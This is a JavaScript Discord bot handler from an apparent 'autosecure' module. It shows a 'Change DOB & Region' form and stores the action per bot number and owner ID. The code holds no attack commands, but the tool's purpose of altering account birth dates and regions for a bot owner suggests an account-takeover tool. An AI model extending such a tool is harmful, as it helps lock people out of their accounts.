const generate = require("../../../autosecure/utils/generate");
const { queryParams } = require("../../../db/database");
const modalBuilder = require("../../../autosecure/utils/utils/modalBuilder");
const { TextInputStyle } = require('discord.js');

module.exports = {
    name: "changedobautosecure",
    editautosecure: true,
    callback: async (client, interaction) => {
        let [t, botnumber, ownerid] = interaction.customId.split("|");

        let actionId = generate(32);
        await queryParams(
            `INSERT INTO actions (id, action) VALUES (?, ?)`,
            [actionId, `modalchangedob|${botnumber}|${ownerid}`]
        );
        
        const customModalId = `action|${actionId}`;
        
        interaction.showModal(modalBuilder(
            customModalId,
            `Change DOB & Region`,
            [
                {
                    setCustomId: 'day',
                    setMaxLength: 2,
                    setRequired: false,
                    setLabel: "DD",
                    setPlaceholder: "Day (1-30)",
                    setStyle: TextInputStyle.Short
                },
                {
                    setCustomId: 'month',
                    setMaxLength: 2,
                    setRequired: false,
                    setLabel: "MM",
                    setPlaceholder: "Month (1-12)",
                    setStyle: TextInputStyle.Short
                },
                {
                    setCustomId: 'year',
                    setMaxLength: 4,
                    setRequired: false,
                    setLabel: "YYYY",
                    setPlaceholder: "Year (1933-2007)",
                    setStyle: TextInputStyle.Short
                },
                {
                    setCustomId: 'country',
                    setRequired: false,
                    setLabel: "Country name or ISO (2 or 3) code",
                    setPlaceholder: "e.g. United States or US",
                    setStyle: TextInputStyle.Short
                }
            ]
        ));
    }
};